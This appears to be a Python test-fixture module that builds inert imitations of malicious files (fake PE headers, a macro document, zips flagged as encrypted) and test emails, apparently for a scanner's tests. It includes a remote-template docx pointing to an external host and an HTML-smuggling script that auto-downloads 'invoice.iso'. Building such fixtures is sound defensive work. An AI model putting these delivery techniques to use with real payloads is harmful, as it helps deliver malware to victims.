"""Builders for inert test samples.

These only imitate the *structure* of malicious files (magic bytes, archive layout,
markers); none of them contains working code.
"""

from __future__ import annotations

import io
import zipfile
from email.message import EmailMessage


def fake_pe() -> bytes:
    """DOS/PE headers only: detected as an executable, but runs nothing."""
    data = bytearray(b"MZ" + b"\x00" * 0x3A + (0x40).to_bytes(4, "little"))
    data += b"PE\x00\x00" + b"\x00" * 64
    return bytes(data)


def make_zip(files: dict[str, bytes], encrypted: set[str] = frozenset()) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    raw = bytearray(buf.getvalue())
    # zipfile cannot write encrypted entries; set the "encrypted" flag bit instead,
    # which is all a listing (and a scanner) can see without the password.
    for name in encrypted:
        for sig in (b"PK\x03\x04", b"PK\x01\x02"):
            pos = 0
            while (pos := raw.find(sig, pos)) != -1:
                flag_at = pos + (6 if sig == b"PK\x03\x04" else 8)
                name_len_at = pos + (26 if sig == b"PK\x03\x04" else 28)
                header = 30 if sig == b"PK\x03\x04" else 46
                n = int.from_bytes(raw[name_len_at:name_len_at + 2], "little")
                if raw[pos + header:pos + header + n] == name.encode():
                    raw[flag_at] |= 0x01
                pos += 4
    return bytes(raw)


def fake_docm() -> bytes:
    return make_zip({
        "[Content_Types].xml": b"<Types/>",
        "word/document.xml": b"<w:document/>",
        "word/vbaProject.bin": b"\xd0\xcf\x11\xe0 inert",
    })


def fake_remote_template_docx() -> bytes:
    rels = (b'<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
            b'officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.9/t.dotm" '
            b'TargetMode="External"/></Relationships>')
    return make_zip({
        "[Content_Types].xml": b"<Types/>",
        "word/document.xml": b"<w:document/>",
        "word/_rels/settings.xml.rels": rels,
    })


SMUGGLING_HTML = (
    "<html><body><p>Loading document...</p><script>"
    "var d = atob('" + "QUFB" * 1200 + "');"
    "var b = new Blob([d], {type: 'application/octet-stream'});"
    "var a = document.createElement('a'); a.href = URL.createObjectURL(b);"
    "a.download = 'invoice.iso'; a.click();"
    "</script></body></html>"
).encode()


def message_with(attachments: list[tuple[str | None, str, bytes]], body: str = "See attached.") -> bytes:
    """attachments: (filename, content_type, data)."""
    msg = EmailMessage()
    msg["From"] = "sender@example.com"
    msg["To"] = "victim@corp.test"
    msg["Subject"] = "Documents"
    msg["Date"] = "Wed, 23 Sep 2026 08:00:00 +0000"
    msg["Message-ID"] = "<att@example.com>"
    msg.set_content(body)
    for filename, ctype, data in attachments:
        maintype, subtype = ctype.split("/", 1)
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=filename)
    return msg.as_bytes()
